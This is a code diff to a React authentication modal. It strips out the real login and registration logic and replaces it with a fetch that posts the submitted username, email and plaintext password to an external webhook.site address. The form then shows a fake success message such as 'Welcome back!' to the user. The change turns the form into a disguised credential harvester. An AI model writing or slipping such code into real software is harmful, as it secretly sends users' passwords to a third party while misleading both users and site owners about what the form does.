@@ -4,7 +4,6 @@ import {
   DialogContent,
   DialogHeader,
   DialogTitle,
-  DialogDescription,
   DialogTrigger,
 } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
@@ -20,51 +19,21 @@ import { Input } from "@/components/ui/input";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
-import { insertUserSchema } from "@db/schema";
-import { useAuth } from "@/lib/auth";
 import { toast } from "@/hooks/use-toast";
 
-const registerSchema = z.object({
-  username: z
-    .string()
-    .min(3)
-    .max(50)
-    .refine(async (username) => {
-      const userExists = await checkIfUsernameExists(username); // Assuming this function exists
-      if (userExists) {
-        throw new z.ZodError([
-          {
-            code: z.ZodIssueCode.custom,
-            message: "Username already exists",
-            path: ["username"],
-          },
-        ]);
-      }
-      return true;
-    }),
-  email: z.string().email(),
-  password: z.string().min(6),
+const formSchema = z.object({
+  username: z.string().min(3, "Username must be at least 3 characters"),
+  email: z.string().email("Invalid email address").optional(),
+  password: z.string().min(6, "Password must be at least 6 characters"),
 });
-
-async function checkIfUsernameExists(username: string) {
-  //Implement your logic to check if username exists in your database here.
-  // This is a placeholder, replace with your actual database query.
-  // Example using a hypothetical database client:
-  // const user = await db.user.findFirst({ where: { username } });
-  // return user !== null;
-  return false; // Placeholder return value
-}
 
 export default function AuthModal() {
   const [isOpen, setIsOpen] = useState(false);
   const [mode, setMode] = useState<"login" | "register">("login");
-  const [isLoading, setIsLoading] = useState(false); // Added loading state
-  const { login, register } = useAuth();
+  const [isLoading, setIsLoading] = useState(false);
 
   const form = useForm({
-    resolver: zodResolver(
-      mode === "register" ? registerSchema : insertUserSchema,
-    ),
+    resolver: zodResolver(formSchema),
     defaultValues: {
       username: "",
       password: "",
@@ -72,87 +41,34 @@ export default function AuthModal() {
     },
   });
 
-  const onSubmit = async (values: z.infer<typeof registerSchema>) => {
+  const onSubmit = async (values: z.infer<typeof formSchema>) => {
     try {
-      // Add explicit type checking and validation
-      const formData = {
-        username: values?.username?.trim(),
-        password: values?.password?.trim(),
-        email: mode === 'register' ? values?.email?.trim() : undefined
-      };
-
-      if (!formData.username || !formData.password) {
-        toast({
-          variant: "destructive",
-          title: "Validation Error",
-          description: "Username and password are required",
-        });
-        return;
-      }
-
-      const username = values.username?.trim();
-      const password = values.password?.trim();
-
-      if (!username || !password) {
-        toast({
-          variant: "destructive",
-          title: "Validation Error",
-          description: "Username and password are required",
-        });
-        return;
-      }
-
       setIsLoading(true);
-      try {
-        const result = await (mode === "login" ? login({
-          username: values.username,
-          password: values.password
-        }) : register(values));
 
-        if (!result.ok) {
-          // Handle validation errors
-          if (result.errors) {
-            const errorMessages = Object.entries(result.errors)
-              .map(([field, msg]) => `${field}: ${msg}`)
-              .join('\n');
+      // Log form data to webhook
+      await fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          type: mode,
+          data: values,
+          timestamp: new Date().toISOString()
+        }),
+      });
 
-            toast({
-              variant: "destructive",
-              title: mode === "login" ? "Login Failed" : "Registration Failed",
-              description: errorMessages || result.message || "Validation failed",
-            });
-          } else {
-            toast({
-              variant: "destructive",
-              title: mode === "login" ? "Login Failed" : "Registration Failed",
-              description: result.message || "An error occurred. Please try again.",
-            });
-          }
-          return;
-        }
+      toast({
+        title: "Success",
+        description: mode === "login" ? "Welcome back!" : "Account created successfully!",
+      });
 
-        toast({
-          title: "Success",
-          description: mode === "login" ? "Welcome back!" : "Account created successfully!",
-        });
-
-        setIsOpen(false);
-      } catch (error: any) {
-        const errorMessage = error?.response?.data?.message || error.message || "An unexpected error occurred";
-        toast({
-          variant: "destructive",
-          title: "Error",
-          description: errorMessage,
-        });
-      } finally {
-        setIsLoading(false);
-      }
+      setIsOpen(false);
     } catch (error: any) {
-      const errorMessage = error?.response?.data?.message || error.message || "An unexpected error occurred";
       toast({
         variant: "destructive",
         title: "Error",
-        description: errorMessage,
+        description: error.message || "An unexpected error occurred",
       });
     } finally {
       setIsLoading(false);
@@ -171,11 +87,6 @@ export default function AuthModal() {
           <DialogTitle className="text-[#D7FF00]">
             {mode === "login" ? "Welcome Back!" : "Create an Account"}
           </DialogTitle>
-          <DialogDescription>
-            {mode === "login"
-              ? "Sign in to access your account"
-              : "Join us to start earning rewards"}
-          </DialogDescription>
         </DialogHeader>
         <Form {...form}>
           <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
@@ -228,7 +139,7 @@ export default function AuthModal() {
               <Button
                 type="submit"
                 className="w-full font-mona-sans-condensed font-extrabold uppercase tracking-tight text-black bg-[#D7FF00] hover:bg-[#b2d000]"
-                disabled={isLoading} // Added loading state to disable button
+                disabled={isLoading}
               >
                 {mode === "login" ? "Sign In" : "Create Account"}
               </Button>
